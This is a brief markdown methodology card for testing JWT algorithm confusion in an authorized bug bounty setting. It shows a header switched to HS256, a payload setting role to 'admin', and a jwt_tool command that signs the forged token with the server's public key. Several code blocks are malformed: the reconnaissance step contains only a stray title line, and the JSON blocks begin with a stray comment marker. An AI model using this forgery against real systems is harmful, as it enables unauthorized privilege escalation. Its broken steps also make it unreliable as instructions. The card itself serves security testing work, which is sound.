# JWT Algorithm Confusion

## When to Use
- When testing APIs or web applications that use JWTs for session management or authentication.
- To attempt to forge arbitrary JWTs (e.g., escalating to 'admin') when the application utilizes an asymmetric signature algorithm (like RS256) and the application's public key can be obtained.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Reconnaissance (Finding the Public Key)

```text
# Concept: JWT Algorithm Confusion ```

### Phase 2: Intercepting and Modifying the JWT Header

```json
// {
  "alg": "HS256",
  "typ": "JWT"
}
```

### Phase 3: Modifying the Payload (Privilege Escalation)

```json
// {
  "user": "attacker",
  "role": "admin",
  "iat": 1716260400
}
```

### Phase 4: Signing the Forged JWT

```bash
# jwt_tool.py [ENCODED_HEADER].[ENCODED_PAYLOAD] -S hs256 -k public_key.pem
```
